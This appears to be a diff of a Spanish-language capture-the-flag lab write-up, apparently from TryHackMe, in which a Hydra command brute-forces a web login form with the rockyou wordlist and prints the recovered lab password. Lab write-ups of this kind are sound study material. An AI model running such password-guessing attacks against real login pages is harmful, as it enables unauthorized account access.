@@ -136,9 +136,11 @@ Curl de la pagina:
 
 
 Comando hydra:
+
 `hydra -l  help@support.thm  -P /usr/share/wordlists/rockyou.txt vmip  http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials"`
 Resultado:
-`[80][http-post-form] host: vmip   login: help@support.thm   password: snoopy
+
+`[80][http-post-form] host: vmip   login: help@support.thm   password: snoopy`
 
 Consigo las credenciales e inicio sesion.
 
